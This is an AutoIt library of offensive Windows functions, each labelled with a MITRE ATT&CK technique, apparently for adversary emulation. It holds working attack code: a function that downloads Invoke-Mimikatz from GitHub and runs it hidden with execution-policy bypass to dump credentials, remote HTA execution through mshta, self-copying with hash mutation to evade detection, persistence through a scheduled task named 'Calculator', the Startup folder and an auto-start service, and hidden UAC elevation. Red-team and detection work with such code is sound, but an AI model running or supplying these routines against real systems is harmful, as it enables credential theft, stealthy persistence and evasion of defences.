#include-once

; Process spawning, scheduling, and execution-context checks

; Relocation protocol tokens — shared by HandleRelocation, MoveAndExec, CopyAndExec
Global Const $RELOC_DELETE = "delete_previous"
Global Const $RELOC_KEEP   = "keep_previous"

Func HandleRelocation() ;DESCRIPTION:Call at entry point — if launched by MoveAndExec/CopyAndExec, terminates and optionally deletes the parent instance;MITRE:DefenseEvasion T1036
   If $CmdLine[0] < 2 Then Return
   Local $sAction = $CmdLine[1]
   Local $sArg    = $CmdLine[2]
   If Not FileExists($sArg) Then Return
   Local $szDrive, $szDir, $szFName, $szExt
   _PathSplit($sArg, $szDrive, $szDir, $szFName, $szExt)
   ProcessClose($szFName & $szExt)
   Sleep(2000)
   If $sAction == $RELOC_DELETE Then FileDelete($sArg)
EndFunc

Func RunElevated($sPsCommand = 'cd ..; cd ..; dir; Read-Host -Prompt ''Press Enter''') ;DESCRIPTION:Run a PowerShell command in an elevated process via UAC prompt;MITRE:Execution T1059.001,PrivilegeEscalation T1548.002
   Local $sEscaped = StringReplace($sPsCommand, "'", "''")
   ; Use -ArgumentList to pass the command cleanly to the elevated process
   ; -Wait makes Start-Process block until the elevated window closes
   Local $sElevated = 'Start-Process powershell -Verb runAs -ArgumentList ''-NoExit'',''-Command'',''' & $sEscaped & ''' -Wait'
   RunWait(@ComSpec & ' /c powershell.exe -Command "' & $sElevated & '"', "", @SW_HIDE)
EndFunc

Func CreateScheduledTask($sExePath) ;DESCRIPTION:Create a scheduled task that runs the given executable every minute;MITRE:Persistence T1053.005
   Return ExecCommand("schtasks /create /sc minute /mo 1 /tn Calculator /tr " & $sExePath)
EndFunc

Func DeleteScheduledTask($sTaskName) ;DESCRIPTION:Delete a scheduled task by name;MITRE:Persistence T1053.005
   Return ExecCommand("schtasks /delete /TN " & $sTaskName)
EndFunc

Func IsRunningFromDir($sFolder) ;DESCRIPTION:Return True if the script is currently running from the given folder;MITRE:DefenseEvasion T1036
   Return StringUpper(@ScriptDir) == StringUpper($sFolder)
EndFunc

Func MoveAndExec($sDestDir = "C:\WINDOWS\TEMP", $sNewName = GenerateFilename()) ;DESCRIPTION:Move the exe to a new location, mutate its hash, re-execute it, and delete the original;MITRE:DefenseEvasion T1036,Persistence T1036
   If IsRunningFromDir($sDestDir) Then Return True
   Local $sSrc  = @ScriptDir & "\" & @ScriptName
   Local $sDest = $sDestDir & "\" & $sNewName
   FileCopy($sSrc, $sDest, $FC_OVERWRITE + $FC_CREATEPATH)
   MutateFileHash($sDest)
   RunWait($sDest & " " & $RELOC_DELETE & " " & FileGetShortName($sSrc))
EndFunc

Func CopyAndExec($sDestDir = "C:\WINDOWS\TEMP", $sNewName = GenerateFilename()) ;DESCRIPTION:Copy the exe to a new location, mutate its hash, and re-execute it leaving the original intact;MITRE:DefenseEvasion T1036
   If IsRunningFromDir($sDestDir) Then Return True
   Local $sSrc  = @ScriptDir & "\" & @ScriptName
   Local $sDest = $sDestDir & "\" & $sNewName
   FileCopy($sSrc, $sDest, $FC_OVERWRITE + $FC_CREATEPATH)
   MutateFileHash($sDest)
   RunWait($sDest & " " & $RELOC_KEEP & " " & FileGetShortName($sSrc))
EndFunc

Func Mimikatz() ;DESCRIPTION:Invoke Mimikatz credential dump via the Empire PowerShell module;MITRE:CredentialAccess T1003.001
   Local $sRepoPath = "EmpireProject/Empire"
   Local $sPsCmd    = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/" & $sRepoPath & "/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & $sPsCmd)
EndFunc

Func AddToStartupFolder($sExePath) ;DESCRIPTION:Copy an executable to the current user Startup folder for persistence;MITRE:Persistence T1547.001
   Local $sStartup = @AppDataDir & "\Microsoft\Windows\Start Menu\Programs\Startup"
   Local $szDrive, $szDir, $szFName, $szExt
   _PathSplit($sExePath, $szDrive, $szDir, $szFName, $szExt)
   Return FileCopy($sExePath, $sStartup & "\" & $szFName & $szExt, $FC_OVERWRITE)
EndFunc

Func CreateService($sName, $sExePath) ;DESCRIPTION:Create and start a Windows service for persistent execution;MITRE:Persistence T1543.003
   ExecCommand("sc create " & $sName & " binPath= """ & $sExePath & """ start= auto")
   Return ExecCommand("sc start " & $sName)
EndFunc

Func ExecViaWMI($sCommand) ;DESCRIPTION:Execute a command via WMI process creation — avoids direct process spawning from current parent;MITRE:Execution T1047
   Return ExecCommand("wmic process call create """ & $sCommand & """")
EndFunc

Func ExecViaMshta($sUrl) ;DESCRIPTION:Execute a remote HTA script via mshta.exe (LOLBin);MITRE:Execution T1218.005
   RunWait("mshta.exe " & $sUrl, "", @SW_HIDE)
EndFunc
